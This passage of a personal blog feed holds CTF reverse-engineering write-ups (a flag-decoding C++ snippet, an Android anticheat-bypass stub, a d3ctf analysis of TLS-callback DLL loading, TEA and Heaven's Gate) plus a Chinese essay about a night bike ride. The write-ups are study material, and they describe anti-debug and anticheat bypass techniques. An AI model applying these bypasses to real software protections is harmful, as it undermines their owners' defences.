class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> b[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> flag[]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">36</span>;i++)&#123;</span><br><span class="line">    flag[i]=(i+<span class="number">32</span>)^a[i+<span class="number">5</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">    cout&lt;&lt;(<span class="type">char</span>)flag[i];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/03/03/VM/3.png" alt="3"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>vnctf2023</title>
    <url>/2023/02/27/vnctf2023/</url>
    <content><![CDATA[<h3 id="vnctf2023-re"><a href="#vnctf2023-re" class="headerlink" title="vnctf2023 re"></a>vnctf2023 re</h3><ul>
<li><a href="#1.1">BabyAnti</a><span id="more"></span></li>
</ul>
<h4 id="BabyAnti"><a href="#BabyAnti" class="headerlink" title="BabyAnti"></a><div id="1.1">BabyAnti<div></div></div></h4><h5 id="An-android-reverse-problem-The-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-CE-to-pass-the-game"><a href="#An-android-reverse-problem-The-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-CE-to-pass-the-game" class="headerlink" title="An android reverse problem. The official solution is to patch and bypass the anticheat module and use CE to pass the game."></a>An android reverse problem. The official solution is to patch and bypass the anticheat module and use CE to pass the game.</h5><h5 id="Unpacked-the-apk-and-check-it-in-the-ida-When-the-dynamic-library-been-loaded-it-shall-call-the-function-JNI-OnLoad-We-can-see-four-function-after-it"><a href="#Unpacked-the-apk-and-check-it-in-the-ida-When-the-dynamic-library-been-loaded-it-shall-call-the-function-JNI-OnLoad-We-can-see-four-function-after-it" class="headerlink" title="Unpacked the apk and check it in the ida. When the dynamic library been loaded, it shall call the function JNI_OnLoad. We can see four function after it."></a>Unpacked the apk and check it in the ida. When the dynamic library been loaded, it shall call the function JNI_OnLoad. We can see four function after it.</h5><p><code>ret of four func, to be continue</code></p>
<h5 id="A-antiCheat-class-in-Smali-pack"><a href="#A-antiCheat-class-in-Smali-pack" class="headerlink" title="A antiCheat class in Smali pack"></a>A antiCheat class in Smali pack</h5><p><code>to be continue</code></p>
]]></content>
  </entry>
  <entry>
    <title>夜彳亍</title>
    <url>/2023/03/17/%E5%A4%9C%E5%BD%B3%E4%BA%8D/</url>
    <content><![CDATA[<h4 id="夜彳亍京城"><a href="#夜彳亍京城" class="headerlink" title="夜彳亍京城"></a>夜彳亍京城</h4><h6 id="题目来源于AiDai学长、bridge和nova等"><a href="#题目来源于AiDai学长、bridge和nova等" class="headerlink" title="题目来源于AiDai学长、bridge和nova等"></a>题目来源于AiDai学长、bridge和nova等</h6><h6 id="长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师"><a href="#长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师" class="headerlink" title="长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师"></a>长久不写文，感觉还是需要偶尔动动笔，不然对不起初高中语文老师</h6><span id="more"></span>
<ul>
<li><a href="#1">夜彳亍</a></li>
<li><a href="#2">回程</a></li>
</ul>
<h4 id="夜彳亍"><a href="#夜彳亍" class="headerlink" title="夜彳亍"></a><div id="1">夜彳亍<div></div></div></h4><h5 id="倒也没有什么特别想去的地方，但缘由是一直呆在校内挺累的，一天也没有什么安静的独处时间，于是乎于2023年3月17日夜晚八点零七分，欣然骑了个车夜彳亍。"><a href="#倒也没有什么特别想去的地方，但缘由是一直呆在校内挺累的，一天也没有什么安静的独处时间，于是乎于2023年3月17日夜晚八点零七分，欣然骑了个车夜彳亍。" class="headerlink" title="倒也没有什么特别想去的地方，但缘由是一直呆在校内挺累的，一天也没有什么安静的独处时间，于是乎于2023年3月17日夜晚八点零七分，欣然骑了个车夜彳亍。"></a>倒也没有什么特别想去的地方，但缘由是一直呆在校内挺累的，一天也没有什么安静的独处时间，于是乎于2023年3月17日夜晚八点零七分，欣然骑了个车夜彳亍。</h5><h5 id="这样的夜彳亍前一阵也来了一次，约莫是在下午的夜彳亍。但出校门右转，沿着高架上的地铁一路走，走到尽头，由于不能判断前面的路上了高架还能不能正常下来，便作罢回校。"><a href="#这样的夜彳亍前一阵也来了一次，约莫是在下午的夜彳亍。但出校门右转，沿着高架上的地铁一路走，走到尽头，由于不能判断前面的路上了高架还能不能正常下来，便作罢回校。" class="headerlink" title="这样的夜彳亍前一阵也来了一次，约莫是在下午的夜彳亍。但出校门右转，沿着高架上的地铁一路走，走到尽头，由于不能判断前面的路上了高架还能不能正常下来，便作罢回校。"></a>这样的夜彳亍前一阵也来了一次，约莫是在下午的夜彳亍。但出校门右转，沿着高架上的地铁一路走，走到尽头，由于不能判断前面的路上了高架还能不能正常下来，便作罢回校。</h5><h5 id="这么走是没有目的的，所以也不看导航，但也总该有点方向，旁边的岔路晚上并不怎么开灯，对于夜彳亍来说似乎也有些危险。于是沿着同一个高架，同一个地铁线走，往左。天气很冷，夜晚夜彳亍比下午冷多了，尤其是骑车，颇有手指不可屈伸的美感。"><a href="#这么走是没有目的的，所以也不看导航，但也总该有点方向，旁边的岔路晚上并不怎么开灯，对于夜彳亍来说似乎也有些危险。于是沿着同一个高架，同一个地铁线走，往左。天气很冷，夜晚夜彳亍比下午冷多了，尤其是骑车，颇有手指不可屈伸的美感。" class="headerlink" title="这么走是没有目的的，所以也不看导航，但也总该有点方向，旁边的岔路晚上并不怎么开灯，对于夜彳亍来说似乎也有些危险。于是沿着同一个高架，同一个地铁线走，往左。天气很冷，夜晚夜彳亍比下午冷多了，尤其是骑车，颇有手指不可屈伸的美感。"></a>这么走是没有目的的，所以也不看导航，但也总该有点方向，旁边的岔路晚上并不怎么开灯，对于夜彳亍来说似乎也有些危险。于是沿着同一个高架，同一个地铁线走，往左。天气很冷，夜晚夜彳亍比下午冷多了，尤其是骑车，颇有手指不可屈伸的美感。</h5><h5 id="但往左走原来也有尽头，高架只会带你走短短一些路。等到了路尾，发现没有路了，人群往四面散去。有些人似乎是执意孤行的，在末尾上了地铁。似乎都是大学生。短暂的二十载中，我也一直跟着地铁，我不知道该往哪走，我只知道大家都走这条路。不走这条路的人，或许附近有房，或许在附近打晚工，总归不是一道人。跟着一道人走，往往是没错的。但尽头没路了。但上地铁并不是我此行的目的，也不是我这个时间的想法。那往左拐，左边的人比较多，或许会指引我到什么地方。"><a href="#但往左走原来也有尽头，高架只会带你走短短一些路。等到了路尾，发现没有路了，人群往四面散去。有些人似乎是执意孤行的，在末尾上了地铁。似乎都是大学生。短暂的二十载中，我也一直跟着地铁，我不知道该往哪走，我只知道大家都走这条路。不走这条路的人，或许附近有房，或许在附近打晚工，总归不是一道人。跟着一道人走，往往是没错的。但尽头没路了。但上地铁并不是我此行的目的，也不是我这个时间的想法。那往左拐，左边的人比较多，或许会指引我到什么地方。" class="headerlink" title="但往左走原来也有尽头，高架只会带你走短短一些路。等到了路尾，发现没有路了，人群往四面散去。有些人似乎是执意孤行的，在末尾上了地铁。似乎都是大学生。短暂的二十载中，我也一直跟着地铁，我不知道该往哪走，我只知道大家都走这条路。不走这条路的人，或许附近有房，或许在附近打晚工，总归不是一道人。跟着一道人走，往往是没错的。但尽头没路了。但上地铁并不是我此行的目的，也不是我这个时间的想法。那往左拐，左边的人比较多，或许会指引我到什么地方。"></a>但往左走原来也有尽头，高架只会带你走短短一些路。等到了路尾，发现没有路了，人群往四面散去。有些人似乎是执意孤行的，在末尾上了地铁。似乎都是大学生。短暂的二十载中，我也一直跟着地铁，我不知道该往哪走，我只知道大家都走这条路。不走这条路的人，或许附近有房，或许在附近打晚工，总归不是一道人。跟着一道人走，往往是没错的。但尽头没路了。但上地铁并不是我此行的目的，也不是我这个时间的想法。那往左拐，左边的人比较多，或许会指引我到什么地方。</h5><h5 id="这条路真的很长，长到看不出有什么尽头。就只是一路往下。这里真的很不像北京。或者说不像我想象中的北京。感觉就只是，无端的，荒凉。也许它并不荒凉。但是比想象中的荒凉。车水马龙。"><a href="#这条路真的很长，长到看不出有什么尽头。就只是一路往下。这里真的很不像北京。或者说不像我想象中的北京。感觉就只是，无端的，荒凉。也许它并不荒凉。但是比想象中的荒凉。车水马龙。" class="headerlink" title="这条路真的很长，长到看不出有什么尽头。就只是一路往下。这里真的很不像北京。或者说不像我想象中的北京。感觉就只是，无端的，荒凉。也许它并不荒凉。但是比想象中的荒凉。车水马龙。"></a>这条路真的很长，长到看不出有什么尽头。就只是一路往下。这里真的很不像北京。或者说不像我想象中的北京。感觉就只是，无端的，荒凉。也许它并不荒凉。但是比想象中的荒凉。车水马龙。</h5><h5 id="这个点的车水马龙，并不是什么繁华的象征。"><a href="#这个点的车水马龙，并不是什么繁华的象征。" class="headerlink" title="这个点的车水马龙，并不是什么繁华的象征。"></a>这个点的车水马龙，并不是什么繁华的象征。</h5><h5 id="这意味着这条路是背离市中心的，向着居民区延伸的。"><a href="#这意味着这条路是背离市中心的，向着居民区延伸的。" class="headerlink" title="这意味着这条路是背离市中心的，向着居民区延伸的。"></a>这意味着这条路是背离市中心的，向着居民区延伸的。</h5><h5 id="也许也不是，期间看到一些奇怪的路牌，但是并没有看到与之相称的人，或许是荒废已久的路牌。"><a href="#也许也不是，期间看到一些奇怪的路牌，但是并没有看到与之相称的人，或许是荒废已久的路牌。" class="headerlink" title="也许也不是，期间看到一些奇怪的路牌，但是并没有看到与之相称的人，或许是荒废已久的路牌。"></a>也许也不是，期间看到一些奇怪的路牌，但是并没有看到与之相称的人，或许是荒废已久的路牌。</h5><h5 id="一路走下去，没什么特别的。"><a href="#一路走下去，没什么特别的。" class="headerlink" title="一路走下去，没什么特别的。"></a>一路走下去，没什么特别的。</h5><h5 id="就只是不断不断的出现岔路，岔路的尽头是黑的，一进岔路就几乎没有光了。我的小小共享单车没有车头灯，如果在八十线小城骑一辆有灯的小电动，也许可以敢往下拐，但是我只能不断前进。"><a href="#就只是不断不断的出现岔路，岔路的尽头是黑的，一进岔路就几乎没有光了。我的小小共享单车没有车头灯，如果在八十线小城骑一辆有灯的小电动，也许可以敢往下拐，但是我只能不断前进。" class="headerlink" title="就只是不断不断的出现岔路，岔路的尽头是黑的，一进岔路就几乎没有光了。我的小小共享单车没有车头灯，如果在八十线小城骑一辆有灯的小电动，也许可以敢往下拐，但是我只能不断前进。"></a>就只是不断不断的出现岔路，岔路的尽头是黑的，一进岔路就几乎没有光了。我的小小共享单车没有车头灯，如果在八十线小城骑一辆有灯的小电动，也许可以敢往下拐，但是我只能不断前进。</h5><h5 id="就只是车越来越少，人行道上也看不见什么人了。"><a href="#就只是车越来越少，人行道上也看不见什么人了。" class="headerlink" title="就只是车越来越少，人行道上也看不见什么人了。"></a>就只是车越来越少，人行道上也看不见什么人了。</h5><h5 id="那看看手机地图吧。"><a href="#那看看手机地图吧。" class="headerlink" title="那看看手机地图吧。"></a>那看看手机地图吧。</h5><h5 id="路途中间我是没有看地图的。本来就是没有目的的夜彳亍，看地图总归煞了风景。但那条路真的很长。长得怎么骑也看不到尽头，我也不知道我骑了多远。但这趟夜彳亍我不打算过夜的，我的东西还放在图书馆，得十一点前回来收拾。所以还是看了看地图。"><a href="#路途中间我是没有看地图的。本来就是没有目的的夜彳亍，看地图总归煞了风景。但那条路真的很长。长得怎么骑也看不到尽头，我也不知道我骑了多远。但这趟夜彳亍我不打算过夜的，我的东西还放在图书馆，得十一点前回来收拾。所以还是看了看地图。" class="headerlink" title="路途中间我是没有看地图的。本来就是没有目的的夜彳亍，看地图总归煞了风景。但那条路真的很长。长得怎么骑也看不到尽头，我也不知道我骑了多远。但这趟夜彳亍我不打算过夜的，我的东西还放在图书馆，得十一点前回来收拾。所以还是看了看地图。"></a>路途中间我是没有看地图的。本来就是没有目的的夜彳亍，看地图总归煞了风景。但那条路真的很长。长得怎么骑也看不到尽头，我也不知道我骑了多远。但这趟夜彳亍我不打算过夜的，我的东西还放在图书馆，得十一点前回来收拾。所以还是看了看地图。</h5><h5 id="我原以为我一直在走大道。但实际上似乎还是走到小道里了。"><a href="#我原以为我一直在走大道。但实际上似乎还是走到小道里了。" class="headerlink" title="我原以为我一直在走大道。但实际上似乎还是走到小道里了。"></a>我原以为我一直在走大道。但实际上似乎还是走到小道里了。</h5><h5 id="看不出来，因为一直在自认为最光亮的一条路上走。所以回过头看地图，却也感到诧异。"><a href="#看不出来，因为一直在自认为最光亮的一条路上走。所以回过头看地图，却也感到诧异。" class="headerlink" title="看不出来，因为一直在自认为最光亮的一条路上走。所以回过头看地图，却也感到诧异。"></a>看不出来，因为一直在自认为最光亮的一条路上走。所以回过头看地图，却也感到诧异。</h5><h5 id="不过嘛，没有目的的夜彳亍，确实应该是这样的，也比较有意思。"><a href="#不过嘛，没有目的的夜彳亍，确实应该是这样的，也比较有意思。" class="headerlink" title="不过嘛，没有目的的夜彳亍，确实应该是这样的，也比较有意思。"></a>不过嘛，没有目的的夜彳亍，确实应该是这样的，也比较有意思。</h5><h5 id="那就回来吧，其实也挺无聊的。"><a href="#那就回来吧，其实也挺无聊的。" class="headerlink" title="那就回来吧，其实也挺无聊的。"></a>那就回来吧，其实也挺无聊的。</h5><h5 id="一般都是这样，来的时候总觉得走了好长好长一段路，回首却一会就到了。"><a href="#一般都是这样，来的时候总觉得走了好长好长一段路，回首却一会就到了。" class="headerlink" title="一般都是这样，来的时候总觉得走了好长好长一段路，回首却一会就到了。"></a>一般都是这样，来的时候总觉得走了好长好长一段路，回首却一会就到了。</h5><h5 id="来的时候，右边看到一个卖馒头的。"><a href="#来的时候，右边看到一个卖馒头的。" class="headerlink" title="来的时候，右边看到一个卖馒头的。"></a>来的时候，右边看到一个卖馒头的。</h5><h5 id="看不清，似乎没人，看到了微信收款码。"><a href="#看不清，似乎没人，看到了微信收款码。" class="headerlink" title="看不清，似乎没人，看到了微信收款码。"></a>看不清，似乎没人，看到了微信收款码。</h5><h5 id="还听到（或许是看到呢）一清二楚的大馒头一块钱一个。"><a href="#还听到（或许是看到呢）一清二楚的大馒头一块钱一个。" class="headerlink" title="还听到（或许是看到呢）一清二楚的大馒头一块钱一个。"></a>还听到（或许是看到呢）一清二楚的大馒头一块钱一个。</h5><h5 id="来的时候，就在最后一个十字路口，有一个老太在卖玉米。"><a href="#来的时候，就在最后一个十字路口，有一个老太在卖玉米。" class="headerlink" title="来的时候，就在最后一个十字路口，有一个老太在卖玉米。"></a>来的时候，就在最后一个十字路口，有一个老太在卖玉米。</h5><h5 id="烤玉米，用一个炉子在烧。她似乎在将硬纸板一点一点的塞进去，也许是有火星子冒出来。"><a href="#烤玉米，用一个炉子在烧。她似乎在将硬纸板一点一点的塞进去，也许是有火星子冒出来。" class="headerlink" title="烤玉米，用一个炉子在烧。她似乎在将硬纸板一点一点的塞进去，也许是有火星子冒出来。"></a>烤玉米，用一个炉子在烧。她似乎在将硬纸板一点一点的塞进去，也许是有火星子冒出来。</h5><h5 id="她戴的手套看着很暖和。人群中似乎就我一个人愚蠢到不戴手套。但是具体的我没太注意，绿灯亮起我也就过去了。她似乎在对着过往的人群，大学生或什么，并不大声地喊着烤玉米或玉米的价格或什么。总能在眼里看到一些希冀，或者其他什么。"><a href="#她戴的手套看着很暖和。人群中似乎就我一个人愚蠢到不戴手套。但是具体的我没太注意，绿灯亮起我也就过去了。她似乎在对着过往的人群，大学生或什么，并不大声地喊着烤玉米或玉米的价格或什么。总能在眼里看到一些希冀，或者其他什么。" class="headerlink" title="她戴的手套看着很暖和。人群中似乎就我一个人愚蠢到不戴手套。但是具体的我没太注意，绿灯亮起我也就过去了。她似乎在对着过往的人群，大学生或什么，并不大声地喊着烤玉米或玉米的价格或什么。总能在眼里看到一些希冀，或者其他什么。"></a>她戴的手套看着很暖和。人群中似乎就我一个人愚蠢到不戴手套。但是具体的我没太注意，绿灯亮起我也就过去了。她似乎在对着过往的人群，大学生或什么，并不大声地喊着烤玉米或玉米的价格或什么。总能在眼里看到一些希冀，或者其他什么。</h5><h5 id="总归这次出行没注意什么细节，也许是夜里冷，人太少的缘故。但过来的路确实也又有些不同。总感觉，遛狗的人，悠闲的人多了。"><a href="#总归这次出行没注意什么细节，也许是夜里冷，人太少的缘故。但过来的路确实也又有些不同。总感觉，遛狗的人，悠闲的人多了。" class="headerlink" title="总归这次出行没注意什么细节，也许是夜里冷，人太少的缘故。但过来的路确实也又有些不同。总感觉，遛狗的人，悠闲的人多了。"></a>总归这次出行没注意什么细节，也许是夜里冷，人太少的缘故。但过来的路确实也又有些不同。总感觉，遛狗的人，悠闲的人多了。</h5><h5 id="提着菜的，忙碌的人比来时的路少了。"><a href="#提着菜的，忙碌的人比来时的路少了。" class="headerlink" title="提着菜的，忙碌的人比来时的路少了。"></a>提着菜的，忙碌的人比来时的路少了。</h5><h5 id="回到十字路口。茫然发现，其实过来这条路并不长。"><a href="#回到十字路口。茫然发现，其实过来这条路并不长。" class="headerlink" title="回到十字路口。茫然发现，其实过来这条路并不长。"></a>回到十字路口。茫然发现，其实过来这条路并不长。</h5><h5 id="确实，回头看的时候总觉得，其实确实不是一条有多长的路。"><a href="#确实，回头看的时候总觉得，其实确实不是一条有多长的路。" class="headerlink" title="确实，回头看的时候总觉得，其实确实不是一条有多长的路。"></a>确实，回头看的时候总觉得，其实确实不是一条有多长的路。</h5><h5 id="但反正，还有时间，那在地铁入口的路口，往右拐看看。"><a href="#但反正，还有时间，那在地铁入口的路口，往右拐看看。" class="headerlink" title="但反正，还有时间，那在地铁入口的路口，往右拐看看。"></a>但反正，还有时间，那在地铁入口的路口，往右拐看看。</h5><h5 id="但房屋却比较高大了。虽然还是稀疏。道路也比较宽广了。"><a href="#但房屋却比较高大了。虽然还是稀疏。道路也比较宽广了。" class="headerlink" title="但房屋却比较高大了。虽然还是稀疏。道路也比较宽广了。"></a>但房屋却比较高大了。虽然还是稀疏。道路也比较宽广了。</h5><h5 id="一阵后，感觉没有那么想继续了，回程吧。下次或许从这里继续。"><a href="#一阵后，感觉没有那么想继续了，回程吧。下次或许从这里继续。" class="headerlink" title="一阵后，感觉没有那么想继续了，回程吧。下次或许从这里继续。"></a>一阵后，感觉没有那么想继续了，回程吧。下次或许从这里继续。</h5><h5 id="也有可能去看一下水库，据说风景不错。但是水库大抵是不能晚上去，那只能白天夜彳亍去一趟。"><a href="#也有可能去看一下水库，据说风景不错。但是水库大抵是不能晚上去，那只能白天夜彳亍去一趟。" class="headerlink" title="也有可能去看一下水库，据说风景不错。但是水库大抵是不能晚上去，那只能白天夜彳亍去一趟。"></a>也有可能去看一下水库，据说风景不错。但是水库大抵是不能晚上去，那只能白天夜彳亍去一趟。</h5><h4 id="·-回程"><a href="#·-回程" class="headerlink" title="· 回程"></a><div id="2">· 回程<div></div></div></h4><h5 id="总归是一会就回来了，什么也没发生。本来也不期待什么会发生。"><a href="#总归是一会就回来了，什么也没发生。本来也不期待什么会发生。" class="headerlink" title="总归是一会就回来了，什么也没发生。本来也不期待什么会发生。"></a>总归是一会就回来了，什么也没发生。本来也不期待什么会发生。</h5><h5 id="但也还算发生了点什么，算是给点时间。"><a href="#但也还算发生了点什么，算是给点时间。" class="headerlink" title="但也还算发生了点什么，算是给点时间。"></a>但也还算发生了点什么，算是给点时间。</h5><h5 id="回来看这群打ctf的好像也没聊啥，那倒没错过啥。"><a href="#回来看这群打ctf的好像也没聊啥，那倒没错过啥。" class="headerlink" title="回来看这群打ctf的好像也没聊啥，那倒没错过啥。"></a>回来看这群打ctf的好像也没聊啥，那倒没错过啥。</h5><h5 id="虽然水群太多是该戒戒就是。"><a href="#虽然水群太多是该戒戒就是。" class="headerlink" title="虽然水群太多是该戒戒就是。"></a>虽然水群太多是该戒戒就是。</h5><h5 id="倒是收到某位的消息，想给我“测评”铃芽之旅。你最好是在测评，还是等我们这些非北大生惨兮兮下周看完电影再聊吧。"><a href="#倒是收到某位的消息，想给我“测评”铃芽之旅。你最好是在测评，还是等我们这些非北大生惨兮兮下周看完电影再聊吧。" class="headerlink" title="倒是收到某位的消息，想给我“测评”铃芽之旅。你最好是在测评，还是等我们这些非北大生惨兮兮下周看完电影再聊吧。"></a>倒是收到某位的消息，想给我“测评”铃芽之旅。你最好是在测评，还是等我们这些非北大生惨兮兮下周看完电影再聊吧。</h5><h6 id="感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。"><a href="#感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。" class="headerlink" title="感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。"></a>感觉确实是不如bridge或者nova写的有水平的，反正随手一记，当是开个新坑，以后多做一些记录。</h6><h6 id="没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。"><a href="#没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。" class="headerlink" title="没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。"></a>没拍啥照片，确实没啥好拍的，也确实手冻的拿不住手机。</h6>]]></content>
  </entry>
  <entry>
    <title>d3ctf 2023</title>
    <url>/2023/07/11/d3ctf-2023/</url>
    <content><![CDATA[<h6 id="好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次"><a href="#好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次" class="headerlink" title="好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，结果一看d3好几个题读作solved，写作看一眼毫无印象，遂决定回来重新做一次"></a>好久没写blog了QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看d3那个写不明白的android，<del>结果一看d3好几个题读作solved，写作看一眼毫无印象</del>，遂决定回来重新做一次</h6><span id="more"></span>
<h2 id="d3hell-attachment"><a href="#d3hell-attachment" class="headerlink" title="d3hell_attachment"></a>d3hell_attachment</h2><p><img src="/2023/07/11/d3ctf-2023/image-20230711190621273.png" alt="image-20230711190621273"></p>
<h5 id="首先这里的d3runtime-dll就够可疑的了，调起来就有点印象。先在main开头断下来，果不其然modules里面的d3runtime-dll里面的东西很可疑"><a href="#首先这里的d3runtime-dll就够可疑的了，调起来就有点印象。先在main开头断下来，果不其然modules里面的d3runtime-dll里面的东西很可疑" class="headerlink" title="首先这里的d3runtime.dll就够可疑的了，调起来就有点印象。先在main开头断下来，果不其然modules里面的d3runtime.dll里面的东西很可疑"></a>首先这里的d3runtime.dll就够可疑的了，调起来就有点印象。先在main开头断下来，果不其然modules里面的d3runtime.dll里面的东西很可疑</h5><p><img src="/2023/07/11/d3ctf-2023/image-20230711191017764.png" alt="image-20230711191017764"></p>
<h5 id="之前自己弄过一点dll加载相关的出题（后面有空写个blog记录一下，希望不鸽-虽然已经鸽了半年）这个位置直接调有时候窗口不会自己跳转过来，这里函数不多，直接往每个函数开头下断点"><a href="#之前自己弄过一点dll加载相关的出题（后面有空写个blog记录一下，希望不鸽-虽然已经鸽了半年）这个位置直接调有时候窗口不会自己跳转过来，这里函数不多，直接往每个函数开头下断点" class="headerlink" title="之前自己弄过一点dll加载相关的出题（后面有空写个blog记录一下，希望不鸽,虽然已经鸽了半年）这个位置直接调有时候窗口不会自己跳转过来，这里函数不多，直接往每个函数开头下断点"></a>之前自己弄过一点dll加载相关的出题（后面有空写个blog记录一下，<del>希望不鸽,虽然已经鸽了半年</del>）这个位置直接调有时候窗口不会自己跳转过来，这里函数不多，直接往每个函数开头下断点</h5><h5 id="main里面的sleep常规nop掉，下面的逻辑看着是在骗人，真正的逻辑在dll里"><a href="#main里面的sleep常规nop掉，下面的逻辑看着是在骗人，真正的逻辑在dll里" class="headerlink" title="main里面的sleep常规nop掉，下面的逻辑看着是在骗人，真正的逻辑在dll里"></a>main里面的sleep常规nop掉，下面的逻辑看着是在骗人，真正的逻辑在dll里</h5><h5 id="胆大的直接F9，出锅了，调了调发现卡在sub-40216A，重来"><a href="#胆大的直接F9，出锅了，调了调发现卡在sub-40216A，重来" class="headerlink" title="胆大的直接F9，出锅了，调了调发现卡在sub_40216A，重来"></a>胆大的直接F9，出锅了，调了调发现卡在sub_40216A，重来</h5><h5 id="压根没进main，tls-callback就把dll起起来了（第一遍动态的时候在dll下了断点，第二遍就直接发现了）"><a href="#压根没进main，tls-callback就把dll起起来了（第一遍动态的时候在dll下了断点，第二遍就直接发现了）" class="headerlink" title="压根没进main，tls_callback就把dll起起来了（第一遍动态的时候在dll下了断点，第二遍就直接发现了）"></a>压根没进main，tls_callback就把dll起起来了（第一遍动态的时候在dll下了断点，第二遍就直接发现了）</h5><h5 id="直接进了d3runtime-61FC1628看不出来啥用，有点像花但不能nop的"><a href="#直接进了d3runtime-61FC1628看不出来啥用，有点像花但不能nop的" class="headerlink" title="直接进了d3runtime__61FC1628看不出来啥用，有点像花但不能nop的"></a>直接进了<code>d3runtime__61FC1628</code>看不出来啥用，有点像花但不能nop的</h5><p><img src="/2023/07/11/d3ctf-2023/image-20230711192346716.png" alt="image-20230711192346716"></p>
<h5 id="感觉是故意的…编译器会这么优化么…不能删这里，逻辑是中间的mov-和add-走两次，下面有个一样的操作"><a href="#感觉是故意的…编译器会这么优化么…不能删这里，逻辑是中间的mov-和add-走两次，下面有个一样的操作" class="headerlink" title="感觉是故意的…编译器会这么优化么…不能删这里，逻辑是中间的mov 和add 走两次，下面有个一样的操作"></a>感觉是故意的…编译器会这么优化么…不能删这里，逻辑是中间的mov 和add 走两次，下面有个一样的操作</h5><h5 id="谁教的……"><a href="#谁教的……" class="headerlink" title="谁教的……"></a>谁教的……</h5><h5 id="不能F5，单步往下"><a href="#不能F5，单步往下" class="headerlink" title="不能F5，单步往下"></a>不能F5，单步往下</h5><h5 id="而后d3runtime-61FC1578函数，TEA加密，但是不知道啥用，接着调"><a href="#而后d3runtime-61FC1578函数，TEA加密，但是不知道啥用，接着调" class="headerlink" title="而后d3runtime__61FC1578函数，TEA加密，但是不知道啥用，接着调"></a>而后<code>d3runtime__61FC1578</code>函数，TEA加密，但是不知道啥用，接着调</h5><p><img src="/2023/07/11/d3ctf-2023/image-20230711192920527.png" alt="image-20230711192920527"></p>
<h5 id="这里上了反调，直接过掉，但是后面的代码很奇怪，明显反编译有问题，重调"><a href="#这里上了反调，直接过掉，但是后面的代码很奇怪，明显反编译有问题，重调" class="headerlink" title="这里上了反调，直接过掉，但是后面的代码很奇怪，明显反编译有问题，重调"></a>这里上了反调，直接过掉，但是后面的代码很奇怪，明显反编译有问题，重调</h5><h5 id="注意到一个很奇怪的事情，这里："><a href="#注意到一个很奇怪的事情，这里：" class="headerlink" title="注意到一个很奇怪的事情，这里："></a>注意到一个很奇怪的事情，这里：</h5><p><img src="/2023/07/11/d3ctf-2023/image-20230711194724759.png" alt="image-20230711194724759"></p>
<h5 id="合理的话按照上面相同的写法，应该是E8-00-00-00-00，但是这里少了一个00，一开始以为可以不需要，但是想想不对。这里怎么想都应该是call-5的操作，然后后面可以还原出上面的逻辑"><a href="#合理的话按照上面相同的写法，应该是E8-00-00-00-00，但是这里少了一个00，一开始以为可以不需要，但是想想不对。这里怎么想都应该是call-5的操作，然后后面可以还原出上面的逻辑" class="headerlink" title="合理的话按照上面相同的写法，应该是E8 00 00 00 00，但是这里少了一个00，一开始以为可以不需要，但是想想不对。这里怎么想都应该是call $5的操作，然后后面可以还原出上面的逻辑"></a>合理的话按照上面相同的写法，应该是<code>E8 00 00 00 00</code>，但是这里少了一个00，一开始以为可以不需要，但是想想不对。这里怎么想都应该是<code>call $5</code>的操作，然后后面可以还原出上面的逻辑</h5><h5 id="哦，动动脑子，这里换32-bit了，天堂之门，对应题目hell"><a href="#哦，动动脑子，这里换32-bit了，天堂之门，对应题目hell" class="headerlink" title="哦，动动脑子，这里换32-bit了，天堂之门，对应题目hell"></a>哦，动动脑子，这里换32-bit了，天堂之门，对应题目hell</h5><h5 id="这里确实萌新没接触过天堂之门的，没从tls和DllMainCRTStartup里看出什么端倪，但是总归这里是32bit，那dump下来放进ida里看看，呜哇，修了半个小时修不明白"><a href="#这里确实萌新没接触过天堂之门的，没从tls和DllMainCRTStartup里看出什么端倪，但是总归这里是32bit，那dump下来放进ida里看看，呜哇，修了半个小时修不明白" class="headerlink" title="这里确实萌新没接触过天堂之门的，没从tls和DllMainCRTStartup里看出什么端倪，但是总归这里是32bit，那dump下来放进ida里看看，呜哇，修了半个小时修不明白"></a>这里确实萌新没接触过天堂之门的，没从<code>tls</code>和<code>DllMainCRTStartup</code>里看出什么端倪，但是总归这里是32bit，那dump下来放进ida里看看，呜哇，修了半个小时修不明白</h5><h5 id="那也可以硬调吧，不妨碍，既然他能运行那姑且也可以调"><a href="#那也可以硬调吧，不妨碍，既然他能运行那姑且也可以调" class="headerlink" 